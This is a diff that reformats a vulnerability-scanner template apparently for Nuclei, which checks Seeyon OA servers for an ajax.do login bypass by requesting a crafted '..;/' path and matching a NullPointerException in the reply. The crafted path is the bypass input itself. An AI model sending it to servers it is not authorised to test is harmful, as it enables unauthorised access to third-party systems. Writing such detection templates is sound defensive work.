@@ -1,17 +1,19 @@
 id: zhiyuan-upload-bypass
+
 info:
+  name: 致远OA ajax.do登录绕过
   author: str1am
-  name: "\u81F4\u8FDCOA ajax.do\u767B\u5F55\u7ED5\u8FC7"
   severity: high
   tags: seeyon
+
 requests:
-- matchers:
-  - condition: and
-    part: body
-    type: word
-    words:
-    - java.lang.NullPointerException
-  matchers-condition: and
-  method: GET
-  path:
-  - '{{BaseURL}}/seeyon/thirdpartyController.do.css/..;/ajax.do'
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/thirdpartyController.do.css/..;/ajax.do"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "java.lang.NullPointerException"
+        part: body
+        condition: and
